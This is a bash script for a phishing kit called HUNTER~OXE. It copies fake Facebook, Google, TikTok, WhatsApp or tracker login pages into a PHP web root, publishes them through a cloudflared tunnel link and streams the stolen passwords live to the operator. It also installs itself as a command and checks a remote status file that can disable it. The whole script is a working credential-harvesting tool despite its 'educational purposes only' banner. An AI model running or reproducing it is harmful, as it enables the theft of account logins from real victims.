#!/bin/bash

# --- AUTO-SETUP COMMAND (Yoti azingolemba: hunter) ---
if [[ ! -f $PREFIX/bin/hunter ]]; then
    cp $0 $PREFIX/bin/hunter
    chmod +x $PREFIX/bin/hunter
fi

# --- REMOTE CONTROL ---
STATUS=$(curl -s -L https://raw.githubusercontent.com/hunteroxe1-ai/PEkha/main/status.txt | tr -d '[:space:]')

if [[ "$STATUS" == "OFF" ]]; then
    clear
    echo -e "\e[1;31m"
    echo "  #######################################################"
    echo "  #                                                     #"
    echo "  #                ACCESS DENIED !!!                    #"
    echo "  #                                                     #"
    echo "  #      THIS TOOL HAS BEEN DISABLED BY OWNER           #"
    echo "  #          CONTACT: PHILLIMON ISAAC                   #"
    echo "  #                                                     #"
    echo "  #######################################################"
    echo -e "\e[0m"
    exit
fi

# --- BANNER DESIGN ---
clear
echo -e "\e[1;32m   _  _ _  _ _  _ ___ ____ ____    ____ _  _ ____ "
echo -e "\e[1;32m   |__| |  | |\ |  |  |___ |__/    |  |  \/  |___ "
echo -e "\e[1;32m   |  | |__| | \|  |  |___ |  \    |__| _/\_ |___  v/5.0"
echo -e "\e[1;37m  --------------------------------------------------"
echo -e "\e[1;35m  [*] OWNER    : PHILLIMON ISAAC"
echo -e "\e[1;35m  [*] TOOL TYPE: ADVANCED PHISHING SUITE"
echo -e "\e[1;35m  [*] WARNING  : FOR EDUCATIONAL PURPOSES ONLY ⚠️"
echo -e "\e[1;37m  --------------------------------------------------"
# FB Page Link yobisika mkati mwa mawu
echo -e "\e[1;36m  [*] \e]8;;https://www.facebook.com/profile.php?id=61566844733724\a☠️ click me for more ☠️\e]8;;\a"
echo -e "\e[1;37m  --------------------------------------------------"
echo -e "\e[1;32m  [1] FACEBOOK LOGIN (CLASSIC)"
echo -e "\e[1;32m  [2] GOOGLE LOGIN (OAUTH SYNC)"
echo -e "\e[1;32m  [3] ADVANCED IP & DEVICE TRACKER"
echo -e "\e[1;32m  [4] TIKTOK FOLLOWER BOOSTER"
echo -e "\e[1;32m  [5] WHATSAPP VERIFICATION"
echo -e "\e[1;37m  --------------------------------------------------"
echo -e "\e[1;33m  [L] VIEW LOGS/PASSWORDS  [X] EXIT"
echo -e "\e[1;37m  --------------------------------------------------"
read -p "[?] CHOICE : " choice

# Logic ya ma Options
case $choice in
    1) cp web/classic.html web/index.html ;;
    2) cp web/google.html web/index.html ;;
    3) cp web/tracker.html web/index.html ;;
    4) cp web/tiktok.html web/index.html ;;
    5) cp web/whatsapp.html web/index.html ;;
    L|l) clear; echo -e "\e[1;32m--- DATABASE ---\e[0m"; cat storage/passwords.txt; read -p "Enter to Back"; hunter ;;
    X|x) exit ;;
    *) hunter ;;
esac

# --- STARTING SERVER ---
echo -e "\e[1;33m\n[!] Starting HUNTER~OXE Server...\e[0m"
php -S 127.0.0.1:8080 -t web/ > /dev/null 2>&1 &
sleep 2

# --- CLOUDFLARED (Link Yokha) ---
echo -e "\e[1;32m[+] TARGET LINK GENERATED:\e[0m"
cloudflared tunnel --url http://127.0.0.1:8080 2>&1 | grep -o 'https://[-0-9a-z.]*.trycloudflare.com' &

echo -e "\n\e[1;37m------------------------------------------\e[0m"
echo -e "\e[1;34m[*] WAITING FOR DATA... (Press Ctrl+C to Stop)\e[0m"
echo -e "\e[1;37m------------------------------------------\e[0m"

# --- LIVE PASSWORD VIEWER ---
# Izi zionetsa ma logins pansi pa link pomwepo
touch storage/passwords.txt
tail -f storage/passwords.txt | while read line; do
    echo -e "\e[1;32m[!] NEW DATA CAPTURED:\e[0m"
    echo -e "\e[1;33m$line\e[0m"
    echo -e "\e[1;37m------------------------------------------\e[0m"
done
